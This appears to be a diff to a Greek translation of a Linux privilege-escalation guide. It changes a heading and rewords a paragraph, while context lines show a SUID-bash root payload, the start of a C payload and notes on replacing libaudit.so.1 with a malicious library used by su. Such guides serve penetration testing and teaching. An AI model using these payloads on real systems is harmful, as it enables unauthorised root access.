@@ -7,7 +7,7 @@
 cp /bin/bash /tmp/b && chmod +s /tmp/b
 /bin/b -p #Maintains root privileges from suid, working in debian & buntu
 ```
-## C
+## Γ
 ```c
 //gcc payload.c -o payload
 int main(void){
@@ -76,7 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-Οι συμβολισμοί `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` και `audit_fd` προέρχονται πιθανώς από τη βιβλιοθήκη libaudit.so.1. Καθώς η libaudit.so.1 θα αντικατασταθεί από τη κακόβουλη κοινή βιβλιοθήκη, αυτοί οι συμβολισμοί θα πρέπει να είναι παρόντες στη νέα κοινή βιβλιοθήκη, αλλιώς το πρόγραμμα δεν θα μπορεί να βρει τον συμβολισμό και θα τερματιστεί.
+Τα σύμβολα `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` και `audit_fd` προέρχονται πιθανώς από τη βιβλιοθήκη libaudit.so.1. Καθώς η libaudit.so.1 θα αντικατασταθεί από τη κακόβουλη κοινή βιβλιοθήκη, αυτά τα σύμβολα θα πρέπει να είναι παρόντα στη νέα κοινή βιβλιοθήκη, διαφορετικά το πρόγραμμα δεν θα μπορεί να βρει το σύμβολο και θα τερματιστεί.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
